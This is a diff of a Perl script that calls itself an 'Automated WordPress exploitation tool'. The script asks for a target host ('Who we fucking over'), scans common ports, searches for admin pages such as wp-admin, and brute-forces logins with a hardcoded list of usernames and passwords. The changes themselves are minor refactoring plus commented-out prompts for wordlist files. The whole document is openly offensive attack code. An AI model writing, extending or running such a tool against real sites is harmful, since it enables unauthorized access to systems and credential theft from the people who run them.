@@ -2,7 +2,7 @@
 
 ########
 #
-# Automated full scale annihilation
+# Automated WordPress exploitation tool
 #
 ########
 
@@ -27,8 +27,6 @@ my @ports = qw(20 21 22 23 53 67 68 69 80 88 135 139 443 445);
 my $conPorts;
 my $errPorts;
 my $sock;
-my $to = 100;
-my $proto = 'TCP';
 #Bot building
 my $bot = LWP::UserAgent->new;
 $bot->timeout(10);
@@ -52,6 +50,10 @@ print $banner;
 
 print "\n\n[*]Who we fucking over => ";
 chomp(my $host = <STDIN>);
+#print "\n\n[*]Enter the path to the list of usernames => ";
+#chomp(my $user = <STDIN>);
+#print "\n\n[*]Enter the path to the list of passwords => ";
+#chomp(my $pass = <STDIN>);
 print "++++++++++++++++++++++++++++++\n\n";
 
 #####################################
@@ -67,7 +69,7 @@ foreach my $port (@ports){
     print "[*]Trying port: ", $port, "\n";
     if($sock = IO::Socket::INET->new(PeerAddr => $host,
     PeerPort => $port,
-    Proto => $proto)){
+    Proto => 'tcp')){
       if ($port == 80) {
         my $request = "HEAD / HTTP/1.1\n\n\n\n";
         print $sock $request;
@@ -83,9 +85,6 @@ foreach my $port (@ports){
     close($sock);
   };
 }
-print "++++++++++++++++++++++++++++++++++\n";
-print "[*]Hunting for an admin page\n";
-print "++++++++++++++++++++++++++++++++++\n";
 
 #####################################
 #Running subroutines
@@ -97,7 +96,10 @@ brute_force();
 
 sub admin_find {
 
-#array of typical admin pages
+ #array of typical admin pages
+ print "++++++++++++++++++++++++++++++++++\n";
+ print "[*]Hunting for an admin page\n";
+ print "++++++++++++++++++++++++++++++++++\n";
   my @admins = qw(admin
   administrator
   wp-admin
@@ -125,7 +127,7 @@ sub admin_find {
   }
 }
 ####
-#Brute force //Needs to be adjusted//
+#Brute force //Needs to be adjusted//Will be coming back to
 sub brute_force {
   my @users = qw(admin root administrator user login security person); #support for file reading coming soon
   my @passwds = qw(password 123 admin admin123 BTekgFutvcx1L%9pbN); #support for file reading coming soon
